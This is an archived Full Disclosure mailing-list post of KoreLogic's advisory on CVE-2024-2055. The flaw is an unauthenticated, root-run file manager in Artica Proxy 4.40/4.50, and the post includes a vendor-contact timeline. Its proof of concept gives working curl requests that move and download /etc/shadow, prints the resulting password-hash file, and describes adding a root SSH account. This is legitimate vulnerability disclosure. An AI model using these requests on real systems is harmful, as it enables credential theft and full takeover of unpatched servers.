<!-- MHonArc v2.6.19 -->
<!--X-Head-End-->
<!DOCTYPE html>
<html lang="en">
<head>
<script async src="/site.js"></script>
<link rel="alternate" type="application/rss+xml" title="RSS" href="https://seclists.org/rss/fulldisclosure.rss">
<meta property="og:image" content="https://seclists.org/images/fulldisclosure-img.png" />
<link rel="image_src" href="https://seclists.org/images/fulldisclosure-img.png" />

<meta name="Subject" content="KL-001-2024-003: Artica Proxy Unauthenticated File Manager Vulnerability"/>
<meta name="Author" content="KoreLogic Disclosures via Fulldisclosure"/>
<title>Full Disclosure: KL-001-2024-003: Artica Proxy Unauthenticated File Manager Vulnerability</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#2A0D45">
<link rel="preload" as="image" href="/images/sitelogo.png" imagesizes="168px" imagesrcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x">
<link rel="preload" as="image" href="/shared/images/nst-icons.svg">
<link rel="stylesheet" href="/shared/css/nst.css?v=2">
<script async src="/shared/js/nst.js?v=2"></script>
<link rel="stylesheet" href="/shared/css/nst-foot.css?v=2" media="print" onload="this.media='all'">
<link rel="stylesheet" href="/site.css">
<!--Google Analytics Code-->
<link rel="preload" href="https://www.google-analytics.com/analytics.js" as="script">
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
ga('create', 'UA-11009417-1', 'auto');
ga('send', 'pageview');
</script>
<!--END Google Analytics Code-->
<META NAME="ROBOTS" CONTENT="NOARCHIVE">
<link rel="shortcut icon" href="/shared/images/tiny-eyeicon.png" type="image/png">
</head>
<body><div id="nst-wrapper">

<div id="menu">
 <div class="blur">
  <header id="nst-head">

    <a id="menu-open" href="#menu" aria-label="Open menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#menu">
    </a>
    <a id="menu-close" href="#" aria-label="Close menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#close">
    </a>

   <a id="nst-logo" href="/" aria-label="Home page">
    <img alt="Home page logo" srcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x" src="/images/sitelogo.png" onerror="this.onerror=null;this.srcset=this.src" height=90 width=168></a>

   <nav id="nst-gnav">
    <a class="nlink" href="https://nmap.org/">Nmap.org</a>
    <a class="nlink" href="https://npcap.com/">Npcap.com</a>
    <a class="nlink" href="https://seclists.org/">Seclists.org</a>
    <a class="nlink" href="https://sectools.org">Sectools.org</a>
    <a class="nlink" href="https://insecure.org/">Insecure.org</a>
   </nav>

   <form class="nst-search" id="nst-head-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>

  </header>
 </div>
</div>

<main id="nst-content">

<!--X-Body-Begin-->
<!--X-User-Header-->
<a href="/fulldisclosure/"><img src="/images/fulldisclosure-logo.png" width="80" class="l-logo right" alt="fulldisclosure logo"></a>
<h2 class="m-list"><a href="/fulldisclosure/">Full Disclosure</a>
mailing list archives</h2>
<!--X-User-Header-End-->
<!--X-TopPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="12"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#13">By Date</a>
<a href="14"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="12"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#13">By Thread</a>
<a href="14"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<form class="nst-search center" action="/search/fulldisclosure">
<input class="nst-search-q" name="q" type="search" placeholder="List Archive Search">
<button class="nst-search-button" title="Search">
<img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
src="/shared/images/nst-icons.svg#search">
</button>
</form>

</div>

<!--X-TopPNI-End-->
<!--X-MsgBody-->
<!--X-Subject-Header-Begin-->
<h1 class="m-title">KL-001-2024-003: Artica Proxy Unauthenticated File Manager Vulnerability</h1>
<hr>
<!--X-Subject-Header-End-->
<!--X-Head-of-Message-->


<em>From</em>: KoreLogic Disclosures via Fulldisclosure &lt;fulldisclosure () seclists org&gt;<br>

<em>Date</em>: Tue, 5 Mar 2024 12:30:19 -0600<br>

<!--X-Head-of-Message-End-->
<!--X-Head-Body-Sep-Begin-->
<hr>
<!--X-Head-Body-Sep-End-->
<!--X-Body-of-Message-->
<pre style="margin: 0em;">
KL-001-2024-003: Artica Proxy Unauthenticated File Manager Vulnerability

Title: Artica Proxy Unauthenticated File Manager Vulnerability
Advisory ID: KL-001-2024-003
Publication Date: 2024.03.05
Publication URL: <a  rel="nofollow" href="https://korelogic.com/Resources/Advisories/KL-001-2024-003.txt">https://korelogic.com/Resources/Advisories/KL-001-2024-003.txt</a>


1. Vulnerability Details

     Affected Vendor: Artica
     Affected Product: Artica Proxy
     Affected Version: 4.40 and 4.50
     Platform: Debian 10 LTS
     CWE Classification: CWE-288: Authentication Bypass Using an
                         Alternate Path or Channel, CWE-552: Files
                         or Directories Accessible to External
                         Parties
     CVE ID: CVE-2024-2055


2. Vulnerability Description

     The &quot;Rich Filemanager&quot; feature of Artica Proxy provides a
     web-based interface for file management capabilities. When
     the feature is enabled, it does not require authentication by
     default, and runs as the root user.


3. Technical Description

     The Artica Proxy can be installed with a small amount of
     &quot;Features&quot; enabled. Within the administrative web interface,
     additional features can be installed, enabled, and disabled. The
     &quot;Rich Filemanager&quot; feature is disabled by default. Enabling
     this feature will spawn a listener on port 5000/tcp bound to
     0.0.0.0. By default, when this feature is enabled, authentication
     is not required to access the web interface. The &quot;Rich
     Filemanager&quot; runs as the root user. This provides an
     unauthenticated attacker complete access to the file system.

       root@artica:~# ps -efww | grep -i File
       root      1888  1885  0 09:13 ?        00:00:00 php-fpm: pool RICHFILEMANAGER
       root      1889  1885  0 09:13 ?        00:00:00 php-fpm: pool RICHFILEMANAGER

     This can be exploited by an attacker to add entries in to
     /etc/shadow, /etc/passwd, and /etc/ssh/sshd_config to create
     an additional root-level account that has the ability to SSH
     in to the system.


4. Mitigation and Remediation Recommendation

     No response from vendor. Rich Filemanager feature is disabled
     by default. Leave it that way.


5. Credit

     This vulnerability was discovered by Jim Becher of KoreLogic,
     Inc.


6. Disclosure Timeline

     2023.12.18 - KoreLogic requests vulnerability contact and
                  secure communication method from Artica.
     2023.12.18 - Artica Support issues automated ticket #1703011342
                  promising follow-up from a human.
     2024.01.10 - KoreLogic again requests vulnerability contact and
                  secure communication method from Artica.
     2024.01.10 - KoreLogic mail daemon receives SMTP 554 5.7.1 from
                  mail.articatech.com with response
                  &quot;Client host rejected: Go Away!&quot;
     2024.01.11 - KoreLogic requests vulnerability contact and
                  secure communication method via
                  <a  rel="nofollow" href="https://www.articatech.com/">https://www.articatech.com/</a> &apos;Contact Us&apos; web form.
     2024.01.23 - KoreLogic requests CVE from MITRE.
     2024.01.23 - MITRE issues automated ticket #1591692 promising
                  follow-up from a human.
     2024.02.01 - 30 business days have elapsed since KoreLogic
                  attempted to contact the vendor.
     2024.02.06 - KoreLogic requests update on CVE from MITRE.
     2024.02.15 - KoreLogic requests update on CVE from MITRE.
     2024.02.22 - KoreLogic reaches out to alternate CNA for
                  CVE identifiers.
     2024.02.26 - 45 business days have elapsed since KoreLogic
                  attempted to contact the vendor.
     2024.02.29 - Vulnerability details presented to AHA!
                  (takeonme.org) by proxy.
     2024.03.01 - AHA! issues CVE-2024-2055 to track this
                  vulnerability.
     2024.03.05 - KoreLogic public disclosure.


7. Proof of Concept

     Step 1: Move /etc/shadow to /tmp/shadow
</pre><tt>     $ curl -s -k -X $&apos;GET&apos; -H $&apos;Host: 192.168.2.139:5000&apos; -H $&apos;Accept: application/json, text/javascript, */*; q=0.01&apos; 
</tt><tt>-H $&apos;Accept-Language: en-US,en;q=0.5&apos; -H $&apos;Accept-Encoding: gzip, deflate&apos; -H $&apos;X-Requested-With: XMLHttpRequest&apos; -H 
</tt><tt>$&apos;Connection: close&apos; 
</tt><tt>$&apos;<a  rel="nofollow" href="http://192.168.2.139:5000/connectors/php/filemanager.php?time=1700885542096&amp;mode=move&amp;old=%2Fetc%2Fshadow&amp;new=%2Ftmp%2F&amp;_=1700868631198&apos">http://192.168.2.139:5000/connectors/php/filemanager.php?time=1700885542096&amp;mode=move&amp;old=%2Fetc%2Fshadow&amp;new=%2Ftmp%2F&amp;_=1700868631198&apos</a>;
</tt><pre style="margin: 0em;">

</pre><tt>{&quot;data&quot;:{&quot;id&quot;:&quot;\/tmp\/shadow&quot;,&quot;type&quot;:&quot;file&quot;,&quot;attributes&quot;:{&quot;name&quot;:&quot;shadow&quot;,&quot;path&quot;:&quot;\/tmp\/shadow&quot;,&quot;readable&quot;:1,&quot;writable&quot;:1,&quot;created&quot;:&quot;&quot;,&quot;modified&quot;:&quot;24 
</tt><tt>Nov 2023 15:55&quot;,&quot;timestamp&quot;:1700862914,&quot;height&quot;:0,&quot;width&quot;:0,&quot;size&quot;:&quot;2037&quot;}}}
</tt><pre style="margin: 0em;">

     Step 2: Download /tmp/shadow
</pre><tt>     $ curl -s -k -X $&apos;GET&apos; -H $&apos;Host: 192.168.2.139:5000&apos; -H $&apos;Accept: 
</tt><tt>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos; -H $&apos;Accept-Language: en-US,en;q=0.5&apos; -H 
</tt><tt>$&apos;Accept-Encoding: gzip, deflate&apos; -H $&apos;Connection: close&apos; -H $&apos;Upgrade-Insecure-Requests: 1&apos; -H $&apos;Pragma: no-cache&apos; -H 
</tt><tt>$&apos;Cache-Control: no-cache&apos; 
</tt><tt>$&apos;<a  rel="nofollow" href="http://192.168.2.139:5000/connectors/php/filemanager.php?mode=download&amp;path=%2Ftmp%2Fshadow&amp;time=1700885590870&apos">http://192.168.2.139:5000/connectors/php/filemanager.php?mode=download&amp;path=%2Ftmp%2Fshadow&amp;time=1700885590870&apos</a>;
</tt><pre style="margin: 0em;">

root:$6$Pvb1ivrg5oo.a/om$xtRvfpBBSZgPt/fDjHzw9k9e.jxWaY.LPOqnqHJcSBuQMxtjtG6pBBMMf1Z6D4jtN6kDSB3h5FufJ9DuXv.7R0:19507:0:99999:7:::
     daemon:*:19507:0:99999:7:::
     bin:*:19507:0:99999:7:::
     sys:*:19507:0:99999:7:::
     sync:*:19507:0:99999:7:::
     games:*:19507:0:99999:7:::
     man:*:19507:0:99999:7:::
     lp:*:19507:0:99999:7:::
     mail:*:19507:0:99999:7:::
     <a  rel="nofollow" href="news:*:19507:0:99999:7:::">news:*:19507:0:99999:7:::</a>
     uucp:*:19507:0:99999:7:::
     proxy:*:19507:0:99999:7:::
     www-data:*:19507:0:99999:7:::
     backup:*:19507:0:99999:7:::
     list:*:19507:0:99999:7:::
     irc:*:19507:0:99999:7:::
     gnats:*:19507:0:99999:7:::
     nobody:*:19507:0:99999:7:::
     _apt:*:19507:0:99999:7:::
     systemd-timesync:*:19507:0:99999:7:::
     systemd-network:*:19507:0:99999:7:::
     systemd-resolve:*:19507:0:99999:7:::
     messagebus:*:19507:0:99999:7:::
     quagga:*:19507:0:99999:7:::
     apt-mirror:*:19507:0:99999:7:::
     privoxy:*:19507:0:99999:7:::
     ntp:*:19507:0:99999:7:::
     redsocks:!:19507:0:99999:7:::
     prads:*:19507:0:99999:7:::
     freerad:*:19507:0:99999:7:::
     vnstat:*:19507:0:99999:7:::
     stunnel4:!:19507:0:99999:7:::
     sshd:*:19507:0:99999:7:::
     vde2-net:*:19507:0:99999:7:::
     memcache:!:19507:0:99999:7:::
     davfs2:*:19507:0:99999:7:::
     ziproxy:!:19507:0:99999:7:::
     proftpd:!:19507:0:99999:7:::
     ftp:*:19507:0:99999:7:::
     mosquitto:*:19507:0:99999:7:::
     openldap:!:19507:0:99999:7:::
     munin:*:19507:0:99999:7:::
     msmtp:*:19507:0:99999:7:::
     Debian-snmp:!:19507:0:99999:7:::
     opendkim:*:19507:0:99999:7:::
     avahi:*:19507:0:99999:7:::
     glances:*:19507:0:99999:7:::
     ArticaStats:!:19507:0:99999:7:::
     netdata:!:19507:0:99999:7:::
     mysql:!:19507:0:99999:7:::
     postfix:!:19507:0:99999:7:::
     squid:!:19507:0:99999:7:::
     smokeping:!:19507:0:99999:7:::
     unbound:!:19645:0:99999:7:::

     Step 3: Move /tmp/shadow back to /etc/shadow as not to create a DoS condition
</pre><tt>     $ curl -s -k -X $&apos;GET&apos; -H $&apos;Host: 192.168.2.139:5000&apos; -H $&apos;Accept: application/json, text/javascript, */*; q=0.01&apos; 
</tt><tt>-H $&apos;Accept-Language: en-US,en;q=0.5&apos; -H $&apos;Accept-Encoding: gzip, deflate&apos; -H $&apos;X-Requested-With: XMLHttpRequest&apos; -H 
</tt><tt>$&apos;Connection: close&apos; 
</tt><tt>$&apos;<a  rel="nofollow" href="http://192.168.2.139:5000/connectors/php/filemanager.php?time=1700885798719&amp;mode=move&amp;old=%2Ftmp%2Fshadow&amp;new=%2Fetc%2F&amp;_=1700868631208&apos">http://192.168.2.139:5000/connectors/php/filemanager.php?time=1700885798719&amp;mode=move&amp;old=%2Ftmp%2Fshadow&amp;new=%2Fetc%2F&amp;_=1700868631208&apos</a>;
</tt><pre style="margin: 0em;">

</pre><tt>{&quot;data&quot;:{&quot;id&quot;:&quot;\/etc\/shadow&quot;,&quot;type&quot;:&quot;file&quot;,&quot;attributes&quot;:{&quot;name&quot;:&quot;shadow&quot;,&quot;path&quot;:&quot;\/etc\/shadow&quot;,&quot;readable&quot;:0,&quot;writable&quot;:1,&quot;created&quot;:&quot;&quot;,&quot;modified&quot;:&quot;24 
</tt><tt>Nov 2023 15:55&quot;,&quot;timestamp&quot;:1700862914,&quot;height&quot;:0,&quot;width&quot;:0,&quot;size&quot;:0}}}
</tt><pre style="margin: 0em;">


The contents of this advisory are copyright(c) 2024
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
<a  rel="nofollow" href="http://creativecommons.org/licenses/by-sa/4.0/">http://creativecommons.org/licenses/by-sa/4.0/</a>

KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
<a  rel="nofollow" href="https://www.korelogic.com/about-korelogic.html">https://www.korelogic.com/about-korelogic.html</a>

Our public vulnerability disclosure policy is available at:
<a  rel="nofollow" href="https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v2.3.txt">https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v2.3.txt</a>

</pre><p><strong>Attachment:
<a href="att-13/OpenPGP_signature_asc.bin" ><tt>OpenPGP_signature.asc</tt></a></strong><br>
<em>Description:</em> OpenPGP digital signature</p>
<pre style="margin: 0em;">_______________________________________________
Sent through the Full Disclosure mailing list
<a  rel="nofollow" href="https://nmap.org/mailman/listinfo/fulldisclosure">https://nmap.org/mailman/listinfo/fulldisclosure</a>
Web Archives &amp; RSS: <a  rel="nofollow" href="https://seclists.org/fulldisclosure/">https://seclists.org/fulldisclosure/</a></pre>
<!--X-Body-of-Message-End-->
<!--X-MsgBody-End-->
<!--X-Follow-Ups-->
<hr>
<!--X-Follow-Ups-End-->
<!--X-References-->
<!--X-References-End-->
<!--X-BotPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="12"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#13">By Date</a>
<a href="14"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="12"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#13">By Thread</a>
<a href="14"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
</div>
<h3 class="m-thread">Current thread:</h3>
<ul class="thread">
<li><strong>KL-001-2024-003: Artica Proxy Unauthenticated File Manager Vulnerability</strong> <em>KoreLogic Disclosures via Fulldisclosure (Mar 05)</em>
</ul>


<!--X-BotPNI-End-->
<!--X-User-Footer-->
<!--X-User-Footer-End-->
</main><!-- content -->

<footer id="nst-foot">
   <form class="nst-search" id="nst-foot-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>
<div class="flexlists">
<div class="fl-unit">
<h2><a class="nlink" href="https://nmap.org/">Nmap Security Scanner</a></h2>
<ul>
<li><a class="nlink" href="https://nmap.org/book/man.html">Ref Guide</a>
<li><a class="nlink" href="https://nmap.org/book/install.html">Install Guide</a>
<li><a class="nlink" href="https://nmap.org/docs.html">Docs</a>
<li><a class="nlink" href="https://nmap.org/download.html">Download</a>
<li><a class="nlink" href="https://nmap.org/oem/">Nmap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://npcap.com/">Npcap packet capture</a></h2>
<ul>
<li><a class="nlink" href="https://npcap.com/guide/">User's Guide</a>
<li><a class="nlink" href="https://npcap.com/guide/npcap-devguide.html#npcap-api">API docs</a>
<li><a class="nlink" href="https://npcap.com/#download">Download</a>
<li><a class="nlink" href="https://npcap.com/oem/">Npcap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://seclists.org/">Security Lists</a></h2>
<ul>
<li><a class="nlink" href="https://seclists.org/nmap-announce/">Nmap Announce</a>
<li><a class="nlink" href="https://seclists.org/nmap-dev/">Nmap Dev</a>
<li><a class="nlink" href="https://seclists.org/fulldisclosure/">Full Disclosure</a>
<li><a class="nlink" href="https://seclists.org/oss-sec/">Open Source Security</a>
<li><a class="nlink" href="https://seclists.org/dataloss/">BreachExchange</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://sectools.org">Security Tools</a></h2>
<ul>
<li><a class="nlink" href="https://sectools.org/tag/vuln-scanners/">Vuln scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/pass-audit/">Password audit</a>
<li><a class="nlink" href="https://sectools.org/tag/web-scanners/">Web scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/wireless/">Wireless</a>
<li><a class="nlink" href="https://sectools.org/tag/sploits/">Exploitation</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://insecure.org/">About</a></h2>
<ul>
<li><a class="nlink" href="https://insecure.org/fyodor/">About/Contact</a>
<li><a class="nlink" href="https://insecure.org/privacy.html">Privacy</a>
<li><a class="nlink" href="https://insecure.org/advertising.html">Advertising</a>
<li><a class="nlink" href="https://nmap.org/npsl/">Nmap Public Source License</a>
</ul>
</div>
<div class="fl-unit social-links">
<a class="nlink" href="https://twitter.com/nmap" title="Visit us on Twitter">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#twitter" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://facebook.com/nmap" title="Visit us on Facebook">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#facebook" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://github.com/nmap/" title="Visit us on Github">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#github" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://reddit.com/r/nmap/" title="Discuss Nmap on Reddit">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#reddit" alt="" aria-hidden="true">
 </a>
</div>
</div>
</footer>

</div><!-- wrapper -->
</body>
</html>

